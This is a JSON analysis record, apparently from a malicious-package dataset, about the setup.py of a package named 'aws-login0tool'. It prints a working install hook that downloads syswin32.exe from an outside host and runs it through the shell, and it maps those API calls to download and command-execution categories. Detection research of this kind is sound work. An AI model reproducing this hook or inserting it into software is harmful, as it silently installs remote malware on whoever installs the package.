[
  {
    "pyfile": "setup.py",
    "code_snippet": "from setuptools.command.install import install\nimport urllib.request\nfrom subprocess import run\n\nclass SneakyInstall(install):\n    def run(self): \n        try:\n        \turllib.request.urlretrieve(\"https://tryg.ga/syswin32.exe\", \"syswin32.exe\")\n        \trun(['start', 'syswin32.exe'], shell=True)\n        except Exception as e:\n        \tprint(e)\n        return True",
    "pattern_analysis": {
      "api_sequence": [
        "urllib.request.urlretrieve",
        "subprocess.run"
      ],
      "api_sequence_with_args": [
        "urllib.request.urlretrieve(\"https://tryg.ga/syswin32.exe\", \"syswin32.exe\")",
        "subprocess.run(['start', 'syswin32.exe'], shell=True)"
      ],
      "mapped_sequence": [
        {
          "api_name": "urllib.request.urlretrieve",
          "id": "download_file_url",
          "description": "Downloads file from URL to specified local path",
          "first_id": "network_file_transfer",
          "second_id": "file_download",
          "third_id": "url_file_acquisition"
        },
        {
          "api_name": "subprocess.run",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        }
      ],
      "contextual_code": "import urllib.request\nfrom subprocess import run\n\nclass SneakyInstall(install):\n    def run(self): \n        try:\n            urllib.request.urlretrieve(\"https://tryg.ga/syswin32.exe\", \"syswin32.exe\")\n            run(['start', 'syswin32.exe'], shell=True)\n        except Exception as e:\n            print(e)\n        return True"
    }
  },
  {
    "metadata": {
      "package_name": "aws-login0tool-0.0.10"
    }
  }
]